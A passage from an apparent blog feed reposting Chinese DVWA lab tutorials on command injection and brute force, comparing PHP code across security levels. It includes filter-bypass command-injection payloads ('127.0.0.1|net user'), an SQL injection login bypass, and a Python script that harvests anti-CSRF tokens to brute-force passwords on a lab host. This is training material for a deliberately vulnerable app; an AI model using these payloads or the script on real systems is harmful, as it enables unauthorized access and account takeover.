src="http://image.3001.net/images/20161016/1476577730171.png!small" alt="Command 1&amp;&amp;Command 2"></a></p><p>Command 1&amp;Command 2</p><p>先执行Command 1，不管是否成功，都会执行Command 2</p><p><a href="http://image.3001.net/images/20161016/1476577748635.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161016/1476577748635.png!small" alt="先执行Command 1，不管是否成功，都会执行Command 2"></a></p><p>2、由于使用的是str_replace把”&amp;&amp;” 、”;”替换为空字符，因此可以采用以下方式绕过：</p><p>127.0.0.1&amp;;&amp;ipconfig</p><p><a href="http://image.3001.net/images/20161016/14765777625148.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161016/14765777625148.png!small" alt="127.0.0.1&amp;;&amp;ipconfig 绕过"></a> </p><p>这是因为”127.0.0.1&amp;;&amp;ipconfig”中的” ;”会被替换为空字符，这样一来就变成了”127.0.0.1&amp;&amp; ipconfig” ，会成功执行。</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a><strong>High</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">'ip'</span> ]); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist </span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>( </span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">'| '</span> =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>, </span><br><span class="line">    ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist). </span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Windows </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// *nix </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相比Medium级别的代码，High级别的代码进一步完善了黑名单，但由于黑名单机制的局限性，我们依然可以绕过。</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。</p><p>127.0.0.1|net user</p><p><a href="http://image.3001.net/images/20161016/14765777809564.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161016/14765777809564.png!small" alt="127.0.0.1|net user 利用"></a></p><p>Command 1 | Command 2</p><p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a><strong>Impossible</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ]; </span><br><span class="line">    $target = stripslashes( $target ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects </span></span><br><span class="line">    $octet = explode( <span class="string">"."</span>, $target ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer </span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// If all 4 octets are int's put the IP back together. </span></span><br><span class="line">        $target = $octet[<span class="number">0</span>] . <span class="string">'.'</span> . $octet[<span class="number">1</span>] . <span class="string">'.'</span> . $octet[<span class="number">2</span>] . <span class="string">'.'</span> . $octet[<span class="number">3</span>]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">            <span class="comment">// Windows </span></span><br><span class="line">            $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// *nix </span></span><br><span class="line">            $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相关函数介绍</p><p><em>stripslashes(string)</em></p><p>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</p><p><em>explode(separator,string,limit)</em></p><p>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p><p><em>is_numeric(string)</em></p><p>检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p><p>可以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="DVWA教程" scheme="http://wlfsky.com/tags/DVWA%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DVWA之Brute Force</title>
    <link href="http://wlfsky.com/2018/01/19/DVWA%E4%B9%8BBrute-Force/"/>
    <id>http://wlfsky.com/2018/01/19/DVWA之Brute-Force/</id>
    <published>2018-01-19T07:11:27.000Z</published>
    <updated>2018-01-19T08:19:35.041Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><strong><em>本文转载自 FreeBuf.COM：lonehand</em></strong></p><h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a><strong>DVWA简介</strong></h2><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p>DVWA共有十个模块，分别是</p><blockquote><p>Brute Force（蛮力攻击）</p><p>Command Injection（命令行注入）</p><p>CSRF（跨站请求伪造）</p><p>File Inclusion（文件包含）</p><p>File Upload（文件上传）</p><p>Insecure CAPTCHA （不安全的验证码）</p><p>SQL Injection（SQL注入）</p><p>SQL Injection（Blind）（SQL盲注）</p><p>XSS（Reflected）（反射型跨站脚本）</p><p>XSS（Stored）（存储型跨站脚本）</p></blockquote><p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p><p><img src="/img/dvwa-sql-1.png" alt="dvwa-sql-1.png"></p><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a><strong>Brute Force</strong></h2><p>Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。</p><p><a href="http://image.3001.net/images/20161009/14760002264830.jpg" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161009/14760002264830.jpg!small" alt="1.jpg"></a></p><p><strong>下面将对四种级别的代码进行分析。</strong></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a><strong>Low</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get username </span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password </span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ]; </span><br><span class="line">    $pass = md5( $pass ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database </span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        $avatar = mysql_result( $result, <span class="number">0</span>, <span class="string">"avatar"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p><strong>方法一：爆破利用burpsuite即可完成</strong></p><p>第一步抓包</p><p><a href="http://image.3001.net/images/20161009/14760003309956.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161009/14760003309956.png!small" alt="抓包"></a></p><p>第二步，ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$</p><p><a href="http://image.3001.net/images/20161009/1476000296331.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161009/1476000296331.png!small" alt="ctrl+I将包复制到intruder模块"></a></p><p>第三步选中Payloads，载入字典，点击Start attack进行爆破</p><p><img src="http://image.3001.net/images/20161009/14760003769188.png!small" alt="选中Payloads"><img src="http://image.3001.net/images/20161009/1476000377570.png!small" alt="点击Start attack进行爆破"></p><p>最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。</p><p><img src="http://image.3001.net/images/20161009/14760004176934.png!small" alt="找到正确密码"></p><p><strong>方法二：手工sql注入</strong></p><blockquote><p>Username :admin’ #</p><p>Password :（空）</p></blockquote><p>注入成功</p><p><img src="http://image.3001.net/images/20161009/1476000472219.png!small" alt="注入成功"></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a><strong>Medium</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Sanitise username input </span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ]; </span><br><span class="line">    $user = mysql_real_escape_string( $user ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input </span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ]; </span><br><span class="line">    $pass = mysql_real_escape_string( $pass ); </span><br><span class="line">    $pass = md5( $pass ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database </span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        $avatar = mysql_result( $result, <span class="number">0</span>, <span class="string">"avatar"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        sleep( <span class="number">2</span> ); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相比Low级别的代码，Medium级别的代码主要增加mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击，说基本上是因为查到 MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义（因实验环境的MySQL版本较新，所以并未做相应验证）；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制（sleep(2)实在算不上）。</p><p>具体的mysql_real_escape_string函数绕过问题详见</p><p><a href="http://blog.csdn.net/hornedreaper1988/article/details/43520257" target="_blank" rel="noopener">http://blog.csdn.net/hornedreaper1988/article/details/43520257</a></p><p><a href="http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html" target="_blank" rel="noopener">http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html</a></p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>虽然sql注入不再有效，但依然可以使用Burpsuite进行爆破，与Low级别的爆破方法基本一样，这里就不赘述了。</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a><strong>High</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input </span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ]; </span><br><span class="line">    $user = stripslashes( $user ); </span><br><span class="line">    $user = mysql_real_escape_string( $user ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input </span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ]; </span><br><span class="line">    $pass = stripslashes( $pass ); </span><br><span class="line">    $pass = mysql_real_escape_string( $pass ); </span><br><span class="line">    $pass = md5( $pass ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        $avatar = mysql_result( $result, <span class="number">0</span>, <span class="string">"avatar"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) ); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。</p><p><img src="http://image.3001.net/images/20161009/14760005155007.png!small" alt="验证登录"></p><p>每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。</p><p><img src="http://image.3001.net/images/20161009/1476000526224.png!small" alt="SQL查询"></p><p>同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>由于加入了Anti-CSRFtoken预防无脑爆破，这里就不推荐用Burpsuite了，还是简单用python写个脚本吧。</p><p>下面是我自己写的一个脚本（python 2.7），用户名为admin，对password参数进行爆破并打印结果，仅供各位参考。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">header=&#123;        <span class="string">'Host'</span>: <span class="string">'192.168.153.130'</span>,</span><br><span class="line"><span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line"><span class="string">'If-None-Match'</span>: <span class="string">"307-52156c6a290c0"</span>,</span><br><span class="line"><span class="string">'If-Modified-Since'</span>: <span class="string">'Mon, 05 Oct 2015 07:51:07 GMT'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line"><span class="string">'Referer'</span>: <span class="string">'http://192.168.153.130/dvwa/vulnerabilities/brute/index.php'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'</span>&#125;</span><br><span class="line">requrl = <span class="string">"http://192.168.153.130/dvwa/vulnerabilities/brute/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(requrl,header)</span>:</span></span><br><span class="line">req = urllib2.Request(url=requrl,headers=header)</span><br><span class="line">response = urllib2.urlopen(req)</span><br><span class="line"><span class="keyword">print</span> response.getcode(),</span><br><span class="line">the_page = response.read()</span><br><span class="line"><span class="keyword">print</span> len(the_page)</span><br><span class="line">soup = BeautifulSoup(the_page,<span class="string">"html.parser"</span>)</span><br><span class="line">user_token = soup.form.input.input.input.input[<span class="string">"value"</span>] <span class="comment">#get the user_token</span></span><br><span class="line"><span class="keyword">return</span> user_token</span><br><span class="line"></span><br><span class="line">user_token = get_token(requrl,header)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"rkolin.txt"</span>):</span><br><span class="line">requrl = <span class="string">"http://192.168.153.130/dvwa/vulnerabilities/brute/"</span>+<span class="string">"?username=admin&amp;password="</span>+line.strip()+<span class="string">"&amp;Login=Login&amp;user_token="</span>+user_token</span><br><span class="line">i = i+<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> i,<span class="string">'admin'</span>,line.strip(),</span><br><span class="line">user_token = get_token(requrl,header)</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">10</span>):</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>get_token的功能是通过python的BeautifulSoup库从html页面中抓取user_token的值，为了方便展示，这里设置只尝试10次。</p><p>运行脚本时的Burpsuite截图</p><p><img src="http://image.3001.net/images/20161009/14760005821969.png!small" alt="Burpsuite截图"></p><p>打印的结果从第二行开始依次是序号、用户名、密码、http状态码以及返回的页面长度。</p><p><img src="http://image.3001.net/images/20161009/14760005958917.png!small" 